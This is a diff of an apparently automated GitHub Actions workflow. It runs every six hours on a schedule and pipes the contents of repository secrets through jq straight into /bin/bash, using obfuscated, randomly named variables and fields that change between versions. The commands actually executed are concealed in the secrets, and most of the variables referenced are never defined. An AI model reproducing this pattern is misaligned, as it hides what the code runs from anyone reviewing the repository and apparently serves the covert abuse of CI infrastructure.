@@ -2,32 +2,24 @@ name: yuanqingshen2456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
-
-jobs:  # 16715
+    - cron: '5 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yuanqingshen2456
         env:
-          oh0: ${{ secrets.oh0 }}
+          qemn9374: ${{ secrets.qemn9374 }}
         run: |
-          echo $oh0 | jq -r .kmlc64 | /bin/bash
-          echo $meyoa98267 | jq -r .t7 | /bin/bash
-          echo $hd57 | jq -r .gexg36 | /bin/bash
-          echo $m82041 | jq -r .nsl9 | /bin/bash
-          echo $htveo8271 | jq -r .z3 | /bin/bash
-          echo $cg46 | jq -r .dofzn0 | /bin/bash
-          echo $dzo48 | jq -r .jrhzg3 | /bin/bash
-          echo $ijr3 | jq -r .mwal109 | /bin/bash
-          echo $jmvb8229 | jq -r .opbvq0076 | /bin/bash
-          echo $ugzw1123 | jq -r .mwqwu21 | /bin/bash
-          echo $n30296 | jq -r .jgpa5 | /bin/bash
-          echo $kq1887 | jq -r .nr706 | /bin/bash
-          echo $ccd24072 | jq -r .kc5614 | /bin/bash
-          echo $pu2309 | jq -r .kwj20183 | /bin/bash
-          echo $dhq70 | jq -r .vtc020 | /bin/bash
-          echo $w30201 | jq -r .vri4016 | /bin/bash
-          echo $qnp13246 | jq -r .mkhlo63 | /bin/bash
+          echo $qemn9374 | jq -r .jdwby5 | /bin/bash
+          echo $rr5426 | jq -r .jjhwl5829 | /bin/bash
+          echo $vcs9 | jq -r .gxz02 | /bin/bash
+          echo $vnth43 | jq -r .k8991 | /bin/bash
+          echo $sbobg1980 | jq -r .iv5340 | /bin/bash
+          echo $pxxnw1 | jq -r .f63648 | /bin/bash
+          echo $mk538 | jq -r .ws63 | /bin/bash
+          echo $ylhkr408 | jq -r .c7037 | /bin/bash
+          echo $sobwq91 | jq -r .wf1349 | /bin/bash
+          echo $h435 | jq -r .cvlw4562 | /bin/bash
 
